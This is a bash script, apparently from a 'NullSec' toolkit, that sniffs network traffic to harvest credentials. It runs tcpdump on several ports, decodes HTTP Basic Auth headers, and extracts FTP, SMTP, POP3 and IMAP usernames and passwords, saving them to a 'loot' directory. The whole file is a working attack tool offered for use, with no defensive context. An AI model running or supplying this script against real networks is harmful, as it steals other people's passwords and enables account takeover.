#!/bin/bash
# NullSec Credential Harvester
# Captures credentials from network traffic

LOOT_DIR="/root/loot/creds"
IFACE="${1:-eth0}"

mkdir -p "$LOOT_DIR"
OUTPUT="$LOOT_DIR/creds_$(date +%Y%m%d).txt"

echo "[*] NullSec Credential Harvester"
echo "[*] Interface: $IFACE"

# HTTP Basic Auth
tcpdump -i $IFACE -A -s0 'tcp port 80' 2>/dev/null | \
grep -i "Authorization: Basic" | while read line; do
    cred=$(echo "$line" | grep -oP 'Basic \K\S+' | base64 -d 2>/dev/null)
    echo "[HTTP] $(date '+%H:%M:%S') $cred" >> "$OUTPUT"
done &

# FTP credentials
tcpdump -i $IFACE -A -s0 'tcp port 21' 2>/dev/null | \
grep -iE "USER|PASS" | while read line; do
    echo "[FTP] $(date '+%H:%M:%S') $line" >> "$OUTPUT"
done &

# SMTP credentials
tcpdump -i $IFACE -A -s0 'tcp port 25 or tcp port 587' 2>/dev/null | \
grep -iE "AUTH|USER|PASS" | while read line; do
    echo "[SMTP] $(date '+%H:%M:%S') $line" >> "$OUTPUT"
done &

# POP3/IMAP
tcpdump -i $IFACE -A -s0 'tcp port 110 or tcp port 143' 2>/dev/null | \
grep -iE "USER|PASS|LOGIN" | while read line; do
    echo "[MAIL] $(date '+%H:%M:%S') $line" >> "$OUTPUT"
done &

echo "[*] Harvesting credentials..."
echo "[*] Press Ctrl+C to stop"
wait
